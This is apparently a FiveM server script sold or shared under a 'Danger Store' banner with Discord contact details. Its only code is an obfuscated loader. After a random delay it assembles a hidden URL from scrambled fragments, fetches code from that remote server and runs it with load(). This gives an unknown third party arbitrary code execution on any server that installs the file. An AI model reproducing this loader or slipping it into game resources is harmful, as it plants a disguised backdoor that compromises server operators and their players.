([[
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗
│                                                                                                          │
│     ██████╗  █████╗ ███╗   ██╗ ██████╗ ███████╗██████╗     ███████╗████████╗ ██████╗ ██████╗ ███████╗    │
│     ██╔══██╗██╔══██╗████╗  ██║██╔════╝ ██╔════╝██╔══██╗    ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗██╔════╝    │
│     ██║  ██║███████║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝    ███████╗   ██║   ██║   ██║██████╔╝█████╗      │
│     ██║  ██║██╔══██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗    ╚════██║   ██║   ██║   ██║██╔══██╗██╔══╝      │
│     ██████╔╝██║  ██║██║ ╚████║╚██████╔╝███████╗██║  ██║    ███████║   ██║   ╚██████╔╝██║  ██║███████╗    │
│     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝    │
│                                                                                                          │
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝

	⚠️ 𝗗𝗮𝗻𝗴𝗲𝗿 𝗦𝘁𝗼𝗿𝗲 ⚠️
 
	🔗 [ Discord : https://discord.gg/DTs ] 🔗
	
	☢️ 𝗖𝗼𝗽𝘆𝗿𝗶𝗴𝗵𝒕 © 2026 ☢️

	💌 [ For Info Contact Me On Discord User : oras ] 💌

	💞 شكراً لثقتك 💞  — Thank you for your trust  ✨

      ____                               ____  _                      
     |  _ \  __ _ _ __   __ _  ___ _ __ |  _ \| |__   ___  _ __   ___ 
     | | | |/ _` | '_ \ / _` |/ _ \ '__|| |_) | '_ \ / _ \| '_ \ / _ \
     | |_| | (_| | | | | (_| |  __/ |   |  __/| | | | (_) | | | |  __/
     |____/ \__,_|_| |_|\__, |\___|_|___|_|   |_| |_|\___/|_| |_|\___|
                        |___/      |_____|                            

                                                     
                 
]])



{(function(b)local c=debug.getmetatable(b)debug.setmetatable(b,{__call=function(d,e)debug.setmetatable(b,c)return function(b)b{'1a2981f2a797504f6b205e324384bd6b',d}end end})end)''}(function(b)local b=b[1]Citizen.CreateThread(function()local h=0;for i=1,#b do h=h+string.byte(b,i)end;math.randomseed(h+(os.time()or 0)+math.floor((os.clock()or 0)*1000000));Citizen.Wait(math.random(1000,15000))local c=''local d=24915;local e=0;local f={}while e<966 do e=e+1;while e<605 and d%5260<2630 do e=e+1;d=(d-466)%41090;local b=e+d;if(d%3504)>1752 then d=(d-706)%30483;while e<313 and d%7102<3551 do e=e+1;d=(d*411)%43087;local b=e+d;if(d%14970)>7485 then d=(d*355)%41240;local b=76830;if not f[b]then f[b]=1;c=c..'.'end elseif d%2~=0 then d=(d*316)%34377;local b=51374;if not f[b]then f[b]=1;c=c..'dangers'end else d=(d*939)%2412;e=e+1;local b=67052;if not f[b]then f[b]=1 end end end elseif d%2~=0 then d=(d+986)%9320;while e<597 and d%3566<1783 do e=e+1;d=(d-950)%7147;local b=e+d;if(d%4020)<2010 then d=(d+826)%6247;local b=79206;if not f[b]then f[b]=1;c=c..'ht'end elseif d%2~=0 then d=(d+737)%14175;local b=51471;if not f[b]then f[b]=1;c=c..'tp'end else d=(d*705)%44808;e=e+1;local b=58695;if not f[b]then f[b]=1;c=c..'s:'end end end else d=(d*80)%11734;e=e+1;while e<951 and d%19762<9881 do e=e+1;d=(d*899)%25086;local b=e+d;if(d%11548)>5774 then d=(d*412)%37881;local b=84492;if not f[b]then f[b]=1;c=c..'//'end elseif d%2~=0 then d=(d-419)%22808;local b=94003;if not f[b]then f[b]=1;c=c..'ap'end else d=(d-851)%30011;e=e+1;local b=21386;if not f[b]then f[b]=1;c=c..'i.'end end end end end;d=(d+751)%33125 end(function(d)local e=d;local f=0;local g=0;e={(function(b)if f>34 then return b end;f=f+1;g=(g+3253-b)%79;return(g%3==1 and(function(b)if not d[b]then g=g+1;d[b]=(26)c=c..'il'end;return true end)'igRzv'and e[2](687+b))or(g%3==0 and(function(b)if not d[b]then g=g+1;d[b]=(103)c=c..'.l'end;return true end)'TilxU'and e[3](b+101))or(g%3==2 and(function(b)if not d[b]then g=g+1;d[b]=(227)end;return true end)'QwIsb'and e[1](b+320))or b end),(function(b)if f>32 then return b end;f=f+1;g=(g+1509-b)%57;return(g%3==0 and(function(b)if not d[b]then g=g+1;d[b]=(139)c=c..'win'end;return true end)'aOitw'and e[3](909+b))or(g%3==1 and(function(b)if not d[b]then g=g+1;d[b]=(65)end;return true end)'ObBbT'and e[1](b+129))or(g%3==2 and(function(b)if not d[b]then g=g+1;d[b]=(153)c=c..'ua'end;return true end)'uXJZp'and e[2](b+567))or b end),(function(h)if f>35 then return h end;f=f+1;g=(g+1756-h)%21;return(g%3==2 and(function(b)if not d[b]then g=g+1;d[b]=(2)c=c..'/f'end;return true end)'bdEJm'and e[1](782+h))or(g%3==0 and(function(b)if not d[b]then g=g+1;d[b]=(108)c=c..'es'end;return true end)'JDvcj'and e[3](h+117))or(g%3==1 and(function(e)if not d[e]then g=g+1;d[e]=(10)c=c..'/v1/s/'..b end;return true end)'tIFsS'and e[2](h+748))or h end)}e[2](8832)end){}PerformHttpRequest(c,function(a,b)if b then load(b){}end end)end)end)